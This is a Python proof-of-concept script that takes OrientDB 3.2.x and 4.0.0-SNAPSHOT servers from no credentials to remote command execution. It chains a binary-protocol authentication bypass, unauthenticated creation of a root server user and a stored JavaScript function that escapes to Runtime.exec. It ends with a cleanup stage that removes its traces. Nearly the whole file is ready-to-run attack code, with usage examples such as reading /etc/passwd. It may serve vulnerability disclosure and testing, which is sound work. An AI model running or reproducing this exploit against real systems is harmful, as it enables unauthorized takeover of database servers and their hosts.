#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OrientDB 3.2.x & 4.0.0-SNAPSHOT - unauth -> RCE (one-shot)  [lab/authorized use only]

Version-agnostic: auto-detects the server version and adapts the cleanup step
(4.0.x has the "DROP SYSTEM USER" admin statement; 3.2.x does not).

Full chain, starting with ZERO credentials:

  1) Binary protocol (2424) auth bypass.
       - REQUEST_CONNECT with tokenBased=false creates a connection *before*
         authentication; executeConnect() throws (no-token guard) but never
         disconnects -> the connection survives with tokenBased=false.
       - onBeforeOperationalRequest() then takes the "backward compatibility"
         branch (tokenBased != TRUE) and SKIPS validateSession(), so
         requireServerUser()==false / requireDatabaseSession()==false requests
         run with no auth.
  2) (unauth) REQUEST_SERVER_QUERY (50) runs *admin statements* -> create a
     server ROOT user.
  3) Log in as that root user over HTTP (2480) and create a database.
  4) (auth) CREATE FUNCTION ... LANGUAGE javascript, then invoke it.
       - the stored-function path is NOT covered by the script-interpreter
         allow-list (only the direct command path is), so GraalVM JS runs;
       - the polyglot context uses HostAccess.ALL, so from the bound `db`
         object we climb db.getClass().getClassLoader() -> loadClass ->
         Runtime.exec -> arbitrary OS command.

Usage:
  python3 poc_orientdb_rce.py --cmd "id"
  python3 poc_orientdb_rce.py --host 10.0.0.5 --cmd "cat /etc/passwd"
"""
import argparse, base64, json, random, socket, string, struct, sys, time
import urllib.request, urllib.error

# ---------- binary protocol helpers ----------
def _wstr(s):
    if s is None: return struct.pack(">i", -1)
    b = s.encode(); return struct.pack(">i", len(b)) + b

def _wbytes(b):
    if b is None: return struct.pack(">i", -1)
    return struct.pack(">i", len(b)) + b

class Binary(object):
    def __init__(self, host, port):
        self.host, self.port = host, port
        self.keep = None  # socket holding the unauth connection

    def _connect(self, timeout=4):
        s = socket.create_connection((self.host, self.port), timeout=timeout)
        s.settimeout(timeout)
        f = s.makefile("rb"); f.read(2)          # server protocol version short
        return s, f

    def establish_unauth(self):
        """Failed CONNECT -> unauthenticated legacy connection left alive."""
        s, f = self._connect()
        body  = _wstr("py")                      # driverName
        body += _wstr("0")                       # driverVersion
        body += struct.pack(">h", 36)            # protocolVersion (legacy <37)
        body += _wstr("py")                      # clientId
        body += _wstr("onet_ser_v37")            # recordFormat
        body += bytes([0, 1, 1])                 # tokenBased=false, push, stats
        body += _wstr("x") + _wstr("x")          # bogus user/pass
        s.sendall(bytes([2]) + struct.pack(">i", -1) + body)   # REQUEST_CONNECT
        try: f.read(1)
        except Exception: pass
        self.keep = s                            # keep open: connection persists

    def find_conn_id(self, limit):
        for x in range(1, limit):
            try:
                s, f = self._connect(timeout=2)
                # CONFIG_GET(70) with empty key: correct id -> OK status byte 0
                s.sendall(bytes([70]) + struct.pack(">i", x) + struct.pack(">i", 0))
                st = f.read(1); s.close()
                if st and st[0] == 0:
                    return x
            except Exception:
                pass
        return None

    def op_raw(self, cid, code, body, read_body=False):
        """returns (status_byte, raw_response_bytes)"""
        s, f = self._connect()
        s.sendall(bytes([code]) + struct.pack(">i", cid) + body)
        st, extra = None, b""
        try:
            st = f.read(1)
            if read_body and st:
                s.settimeout(0.5)
                while len(extra) < 8192:
                    try:
                        chunk = f.read1(65536)
                    except Exception:
                        break
                    if not chunk:
                        break
                    extra += chunk
        except Exception:
            pass
        s.close()
        return (st[0] if st else None), extra

    def op(self, cid, code, body):
        return self.op_raw(cid, code, body)[0]

    def server_query(self, cid, statement):
        body  = _wstr("sql") + _wstr(statement)
        body += bytes([0]) + struct.pack(">i", -1)   # opType, recordsPerPage
        body += _wstr(None)                          # fetchPlan
        body += _wbytes(None)                        # paramsBytes
        body += bytes([0])                           # namedParams=false
        return self.op(cid, 50, body)                # REQUEST_SERVER_QUERY

    def server_query_dbg(self, cid, statement):
        body  = _wstr("sql") + _wstr(statement)
        body += bytes([0]) + struct.pack(">i", -1)
        body += _wstr(None) + _wbytes(None) + bytes([0])
        st, raw = self.op_raw(cid, 50, body, read_body=True)
        txt = "".join(chr(c) if 32 <= c < 127 else "." for c in raw)
        return st, txt

def fetch_version(host, port):
    """GET /server/version (this endpoint is unauthenticated on both 3.2.x and 4.0.x)."""
    try:
        req = urllib.request.Request("http://%s:%d/server/version" % (host, port))
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode("utf-8", "replace").strip()
    except Exception:
        return None

# ---------- HTTP helpers ----------
class Http(object):
    def __init__(self, host, port, user, pw):
        self.base = "http://%s:%d" % (host, port)
        self.auth = "Basic " + base64.b64encode(("%s:%s" % (user, pw)).encode()).decode()

    def _req(self, method, path, data=None, ctype="application/json"):
        req = urllib.request.Request(self.base + path, data=(data.encode() if data is not None else None),
                                     headers={"Authorization": self.auth, "Content-Type": ctype}, method=method)
        try:
            with urllib.request.urlopen(req, timeout=20) as r:
                return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception as e:
            return -1, str(e)

    def create_db(self, db):
        return self._req("POST", "/database/%s/plocal" % db)

    def run_sql(self, db, sql):
        return self._req("POST", "/command/%s/sql" % db, sql)

    def call_function(self, db, fn):
        return self._req("POST", "/function/%s/%s" % (db, fn), "")

# ---------- JS payload ----------
def js_literal(s):
    # produce a double-quoted JS string literal safe to embed (no single quotes)
    return '"' + s.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n").replace("\r", "\\r") + '"'

def build_js(cmd):
    cmd_lit = js_literal(cmd)
    return (
        'var cl = db.getClass().getClassLoader();'
        'var rt = cl.loadClass("java.lang.Runtime");'
        'var r = rt.getMethod("getRuntime").invoke(null);'
        'var p = r.exec(["sh","-c",' + cmd_lit + ']);'
        'var is = p.getInputStream();'
        'var out = ""; var b;'
        'while ((b = is.read()) != -1) { out += String.fromCharCode(b); }'
        'p.waitFor();'
        'return out;'
    )

def rand(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def main():
    ap = argparse.ArgumentParser(description="OrientDB 3.2.x / 4.0.0-SNAPSHOT pre-auth -> RCE PoC")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--bin-port", type=int, default=2424)
    ap.add_argument("--http-port", type=int, default=2480)
    ap.add_argument("--cmd", default="id", help="OS command to execute on the server")
    ap.add_argument("--max-id", type=int, default=3000,
                    help="upper bound when scanning for the unauth connection id (default 3000)")
    ap.add_argument("--keep", action="store_true",
                    help="do NOT clean up the artifacts created on the target")
    a = ap.parse_args()

    ver = fetch_version(a.host, a.http_port)
    is_v4 = bool(ver) and ver.startswith("4")
    print("[*] target version = %s" % (ver or "unknown/unreachable"))

    b = Binary(a.host, a.bin_port)
    print("[*] stage 1: binary-protocol auth bypass ...")
    cid = None
    for attempt in range(1, 4):
        b.establish_unauth()
        cid = b.find_conn_id(a.max_id)
        if cid is not None:
            break
        print("    (attempt %d: id not found in 1..%d, retrying ...)" % (attempt, a.max_id))
    if cid is None:
        print("[-] bypass failed: no unauthenticated connection id found in 1..%d." % a.max_id)
        print("    - The vulnerability is likely present, but this long-running/heavily-probed")
        print("      instance has a drifted connection table. RESTART the target and retry.")
        print("    - Or raise --max-id.")
        sys.exit(1)
    print("[+] unauthenticated connection id = %d" % cid)

    print("[*] stage 2: enable db.custom.support (unauth config tamper) ...")
    b.op(cid, 71, _wstr("db.custom.support") + _wstr("true"))   # REQUEST_CONFIG_SET

    user, pw = "cc_" + rand(6), "Pw_" + rand(10)
    print("[*] stage 3: create server ROOT user '%s' (unauth) ..." % user)
    st = b.server_query(cid, "CREATE SYSTEM USER %s IDENTIFIED BY '%s' ROLE root" % (user, pw))
    if st != 0:
        print("[-] SERVER_QUERY failed (status=%s)" % st); sys.exit(1)
    print("[+] root user created")

    h = Http(a.host, a.http_port, user, pw)
    db = "ccdb_" + rand(5)
    print("[*] stage 4: login as root, create database '%s' ..." % db)
    st, _ = h.create_db(db)
    if st not in (200, 201):
        print("[!] create db status=%s (continuing)" % st)
    time.sleep(0.5)

    fn = "ccfn_" + rand(5)
    js = build_js(a.cmd)
    sql = "CREATE FUNCTION %s '%s' LANGUAGE javascript" % (fn, js)
    print("[*] stage 5: create JS function '%s' ..." % fn)
    st, body = h.run_sql(db, sql)
    if st != 200:
        print("[-] create function failed: %s %s" % (st, body[:300])); sys.exit(1)

    print("[*] stage 6: invoke function -> executing: %s" % a.cmd)
    st, out = h.call_function(db, fn)
    print("[+] HTTP %s" % st)
    text = out
    try:
        j = json.loads(out)
        rs = j.get("result")
        if isinstance(rs, list) and rs and isinstance(rs[0], dict) and "value" in rs[0]:
            text = rs[0]["value"]
    except Exception:
        pass
    print("========== command output ==========")
    print(text.strip() if text else "(no output)")
    print("====================================")

    if a.keep:
        print("[*] --keep set: artifacts left on target (db=%s user=%s fn=%s)" % (db, user, fn))
        return

    # ---------- stage 7: cleanup (leave target as found) ----------
    # Use a fresh unauth connection id: the original may be stale after the HTTP stages.
    b.establish_unauth()
    cid2 = b.find_conn_id(a.max_id) or cid
    print("[*] stage 7: cleanup ...")

    # 1) drop the database (removes the JS function and all its records)
    st_db = b.server_query(cid2, "DROP DATABASE %s" % db)
    print("    DROP DATABASE %-14s -> status=%s (0=ok)" % (db, st_db))

    # 2) delete the server account (version-aware):
    #    4.0.x has the "DROP SYSTEM USER" admin statement; 3.2.x does NOT, so
    #    there we delete the OUser record on the system DB directly (as the root
    #    account we just created, over HTTP). Fall back to the other method.
    method, code_u = None, None
    if is_v4:
        if b.server_query(cid2, "DROP SYSTEM USER %s" % user) == 0:
            method, code_u = "DROP SYSTEM USER", "status=0"
    if method is None:
        code_u, _ = h.run_sql("OSystem", "DELETE FROM OUser WHERE name = '%s'" % user)
        method = "DELETE FROM OUser"
    print("    delete account via %-18s -> %s" % (method, code_u))

    # 3) revert the global config change
    b.op(cid2, 71, _wstr("db.custom.support") + _wstr("false"))  # REQUEST_CONFIG_SET
    st_g, extra = b.op_raw(cid2, 70, _wstr("db.custom.support"), read_body=True)
    val = "?"
    if len(extra) >= 8:  # response body = int txid + writeString(value)
        n = struct.unpack(">i", extra[4:8])[0]
        if 0 < n <= 64:
            val = extra[8:8 + n].decode("utf-8", "replace")
    print("    db.custom.support -> %r" % val)

    # verify the account is gone
    code_after, _ = h._req("GET", "/server")
    print("[+] verify: login as deleted account -> HTTP %s (401 = removed)" % code_after)

if __name__ == "__main__":
    main()
